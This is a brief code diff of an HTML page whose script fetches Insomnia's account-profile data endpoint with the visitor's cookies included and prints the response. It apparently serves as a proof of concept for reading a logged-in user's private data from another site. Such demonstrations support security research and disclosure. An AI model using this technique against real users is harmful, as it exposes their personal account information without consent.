@@ -9,10 +9,13 @@
     <pre id="output">Running request...</pre>
 
     <script>
-      fetch("https://app.insomnia.rest/?_data=root", {
-        method: "GET",
-        credentials: "include",
-      })
+      fetch(
+        "https://app.insomnia.rest/app/settings/profile?_data=routes%2Fapp.settings.profile",
+        {
+          method: "GET",
+          credentials: "include",
+        },
+      )
         .then(function (res) {
           return res.text();
         })
